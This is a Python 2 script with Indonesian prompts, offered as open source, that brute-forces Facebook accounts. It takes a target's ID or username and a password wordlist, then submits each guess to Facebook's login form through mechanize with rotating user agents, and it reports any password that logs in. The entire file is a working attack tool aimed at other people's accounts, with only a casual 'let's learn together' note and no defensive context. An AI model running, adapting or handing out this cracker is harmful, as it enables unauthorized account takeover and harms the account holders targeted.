# apa ster mau recode??? 
# silahkan ini open source
# Sama sama belajar ya kan ^^

import os
import sys
import time
import random
import cookielib
import mechanize

# warna 
################
N = '\033[0m'
W = '\033[1;37m'
B = '\033[1;34m'
M = '\033[1;35m'
R = '\033[1;31m'
G = '\033[1;32m'
Y = '\033[1;33m'
C = '\033[1;36m'
I = '\033[1;3m'
################
pareasi = """
%s            ___FACEBOOK  _         ___
        %s   | _ )_ _ _  _| |_ ___  | __|__ _ _ __ ___ v2.0
        %s   | _ \ '_| || |  _/ -_) | _/ _ \ '_/ _/ -_)
         %s  |___/_|  \_,_|\__\___| |_|\___/_| \__\___|
                                            %s (C)2019%s 
                %s----------------------------%s         
                        Author : VrX    
                  Thanks To : Iqbalz Noobs  
                 "Doa Kan Saya Jadi Sukses"
                %s----------------------------%s
"""%(B,W,B,W,G,W,R,W,R,R)

def runntxt(s):
	for pjar in s + '\n':
		sys.stdout.write(pjar)
		sys.stdout.flush()
		time.sleep(10. /2100)

def pjr():
	os.system ("clear")
	print " "
	print pareasi 
pjr()
print "%s[%s*%s] Maaf Codingannya Gk Rapih%s"%(W,G,W,W)
print "[%s!%s] Jika Ada Yang Error Anda Salah Nulis Kali%s"%(R,W,W)
print "[%s!%s] Penulisan Harus Benar%s"%(R,W,W)
print "[%s#%s] MAAF BANYAK BACOT :)%s"%(B,W,W)
print " "
email_target = str(raw_input("- Masukan ID/UserName Target : "))
password_list = str(raw_input("- Masukan Wordlist Yang Sudah Ada : "))
login = 'https://www.facebook.com/login.php?login_attempt=1'
useragents = [('Mozilla/5.0 (X11; Linux x86_64; rv:45.0) Gecko/20100101 Firefox/45.0','Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.1) Geck')]
# useragents = [('Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36','Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.90 Safari/537.36','Mozilla/5.0 (Windows NT 5.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.90 Safari/537.36','Mozilla/5.0 (Windows NT 6.2; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.90 Safari/537.36','Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.157 Safari/537.36','Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/57.0.2987.133 Safari/537.36','Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/57.0.2987.133 Safari/537.36','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87 Safari/537.36','Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87 Safari/537.36',)]

def pil():
	print " %s"(W)
	g = str(raw_input("[?] HACK LAGI ??... [y/n]: "))
	if g == 'y' or g == 'Y':
		os.system('python2 Brute-Force.py')
	elif g == 'n' or g == 'N':
		print "Keluar Dari Program Haiker :V..."
		sys.exit()
		pil()
		
def edit_wordlist():

        print " "
        ed = str(raw_input("[?] MAU EDIT WORDLIST? [y/n]: "))
        if ed == 'y' or ed == 'Y':
                os.system('nano '+password_list)
                pil()
        elif ed == 'n' or ed == 'N':
                print "Bye......."
                sys.exit()

        else:
                print "PILIHAN SALAH!!!....."
                edit_wordlist()

def main():
        global pjar
        pjar = mechanize.Browser()
        cj = cookielib.LWPCookieJar()
        pjar.set_handle_robots(False)
        pjar.set_handle_redirect(True)
        pjar.set_cookiejar(cj)
        pjar.set_handle_equiv(True)
        pjar.set_handle_referer(True)
        pjar.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time=1)
        runn_pjar()
        life()
        print " "
        print " password tidak ada yang cocok !..."
        print " "
def varuxz(varuxz_password):
  try:
 	sys.stdout.write("[\033[91m+\033[92m]\033[91;1m [\033[97m"+email_target+"\033[91m]\033[90m Mencoba ==> \033[91m[\033[90;1m"+varuxz_password)
	sys.stdout.flush()
	pjar.addheaders = [('User-agent', random.choice(useragents))]
	site = pjar.open(login)
	pjar.select_form(nr = 0)
	pjar.form['email'] = email_target
	pjar.form['pass'] = varuxz_password
	tom = pjar.submit()
	mask = tom.geturl()
	if mask != login and (not 'login_attempt' in mask):
                        print " "
			print ("\033[96m                S U C C E S S")
			print "          P A S S W O R D  F I N D "
                  	print "+-------------------------------------------+"
	         	print ("#\033[97m ID / Email Target:\033[92m {}").format(email_target)
        	        print ("#\033[97m Password Target:\033[92m {}").format(varuxz_password)
        	        print " "
        	        raw_input("TEKAN ENTER UNTUK KELUAR...")
			sys.exit(1)
  
  
  except KeyboardInterrupt:
      print "Stop......."
      edit_wordlist()
      sys.exit()    	    
def life():
	global varuxz_password
	password_nob = open(password_list, "r")
	for varuxz_password in password_nob:
		password_nob = varuxz_password.replace("\n","")
		varuxz(varuxz_password)		

def runn_pjar():
         global password_list

         pareasi2 = """  
         [ F A N S OF F R E E D O M ]    
  
             \_________________/
                %s@       %s     @
                
          %ssupported by Iqbalz Noobs%s
         
"""%(R,R,G,W)

         print pareasi2
         mmk = open(password_list, 'r')
         mmk = mmk.readlines()
         print " [#] ID / Username Target\033[97;1m: {}".format(email_target)
         print " [#] JUmlah Password saat ini\033[97;1m:", len(mmk),'password'
         print " [#] Tunggu Proses Cracking\033[97;1m.........."
         print " "

if __name__=='__main__':
	main()	

  

